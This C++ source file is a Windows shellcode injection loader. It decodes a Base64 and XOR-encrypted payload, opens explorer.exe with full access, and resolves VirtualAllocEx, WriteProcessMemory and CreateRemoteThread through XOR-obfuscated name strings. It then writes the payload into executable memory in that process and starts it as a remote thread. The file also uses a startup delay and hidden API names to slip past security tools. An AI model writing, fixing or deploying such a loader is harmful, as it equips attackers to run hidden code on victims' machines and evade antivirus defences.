#include <windows.h>
#include <tlhelp32.h>  // Added for PROCESSENTRY32W and ToolHelp functions
#include <iostream>
#include <string>
#include "shellcode_encoded.h"

typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* WPMType)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);

void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    int j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

LPCSTR DAndP(unsigned char* encoded, size_t len, const char* key, size_t key_len) {
    char* decoded = new char[len + 1];
    memcpy(decoded, encoded, len);
    XOR(reinterpret_cast<unsigned char*>(decoded), len, key, key_len);
    decoded[len] = '\0';
    return decoded;
}

HANDLE GetProcessHandleByName(const std::wstring& processName) {
    HANDLE hProcess = nullptr;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return nullptr;

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                break;
            }
        } while (Process32NextW(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return hProcess;
}

DWORD Base64Decode(const char* input, BYTE** output) {
    DWORD len = 0;
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
    *output = (BYTE*)malloc(len);
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &len, NULL, NULL);
    return len;
}

void DecryptShellcode(BYTE* data, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main(int argc, char* argv[]) {
    Sleep(1500);
    BYTE* decoded = NULL;
    DWORD len = Base64Decode(b64_shellcode, &decoded);
    DecryptShellcode(decoded, len, XOR_KEY);
    unsigned char* sc = decoded;
    
    // Fixed: Use actual length from Base64 decode, not sizeof(pointer)
    DWORD sc_len = len;  
    const char* key = "offensivepanda";
    size_t k_len = strlen(key);

    HANDLE hthread;
    HANDLE handle; 
    HMODULE library = NULL;
    LPVOID my_sc_mem;
    VAExType pVAEx;
    WPMType pWPM;
    CRTType pCRT;

    std::wstring pName = L"explorer.exe";
    HANDLE hProcess = GetProcessHandleByName(pName);

    // Fixed: Use A version for ANSI string
    library = GetModuleHandleA("kernel32.dll");
    
    unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
    unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
    unsigned char sCRT[] = { 0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13, 0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03, 0x07, 0x01 };
    
    LPCSTR A = DAndP(sVAEx, sizeof(sVAEx), key, k_len);
    LPCSTR B = DAndP(sWPM, sizeof(sWPM), key, k_len);
    LPCSTR C = DAndP(sCRT, sizeof(sCRT), key, k_len);
    
    pVAEx = (VAExType)GetProcAddress(library, A);
    pWPM = (WPMType)GetProcAddress(library, B);
    pCRT = (CRTType)GetProcAddress(library, C);

    if (hProcess) {
        std::wcout << L"Handle to " << pName << L": " << hProcess << std::endl;

        my_sc_mem = pVAEx(hProcess, 0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        pWPM(hProcess, my_sc_mem, sc, sc_len, NULL);

        hthread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)my_sc_mem, NULL, 0, NULL);
        if (hthread != NULL) {
            WaitForSingleObject(hthread, 500);
            CloseHandle(hthread);
        }

        CloseHandle(hProcess);
    }
    else {
        std::cerr << "Failed to obtain process handle.\n";
    }

    // Clean up allocated memory
    if (decoded) free(decoded);
    
    // Clean up decoded strings (they were allocated with new)
    delete[] (char*)A;
    delete[] (char*)B;
    delete[] (char*)C;

    return 0;
}